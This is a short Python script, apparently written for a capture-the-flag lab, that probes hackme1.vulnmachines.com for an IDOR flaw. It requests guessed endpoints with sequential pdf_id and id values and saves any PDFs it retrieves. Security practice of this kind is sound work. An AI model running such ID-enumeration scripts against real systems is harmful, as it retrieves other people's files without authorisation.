#!/usr/bin/env python3
import requests

print("[*] Testing IDOR on hackme1.vulnmachines.com")

# Probar los endpoints más comunes
tests = [
    "http://hackme1.vulnmachines.com/idor",
    "http://hackme1.vulnmachines.com/idor/",
    "http://hackme1.vulnmachines.com/IDOR",
    "http://hackme1.vulnmachines.com/IDOR/",
    "http://hackme1.vulnmachines.com/idor/index.php",
    "http://hackme1.vulnmachines.com/idor/download.php",
    "http://hackme1.vulnmachines.com/download.php?pdf_id=1",
    "http://hackme1.vulnmachines.com/download.php?pdf_id=2",
    "http://hackme1.vulnmachines.com/download.php?id=1",
    "http://hackme1.vulnmachines.com/file.php?id=1",
    "http://hackme1.vulnmachines.com/pdf.php?id=1"
]

for url in tests:
    try:
        r = requests.get(url, timeout=5)
        print(f"\n[*] Testing: {url}")
        print(f"    Status: {r.status_code}")
        print(f"    Size: {len(r.content)} bytes")
        
        if r.status_code == 200:
            # Check if it's a PDF
            if r.content[:4] == b'%PDF':
                print(f"    [!!!] PDF FOUND!")
                filename = f"/workspace/found_{url.split('/')[-1].replace('?','_')}.pdf"
                with open(filename, 'wb') as f:
                    f.write(r.content)
                print(f"    Saved to: {filename}")
            # Check if it's not default Apache
            elif len(r.content) != 10918 and b'apache2 ubuntu' not in r.content.lower():
                print(f"    [!] Non-default content found")
                if b'idor' in r.content.lower() or b'pdf' in r.content.lower():
                    print(f"    [!] Contains IDOR/PDF keywords")
                    print(f"    Preview: {r.text[:200]}")
    except Exception as e:
        print(f"[Error] {url}: {e}")

print("\n[*] Done")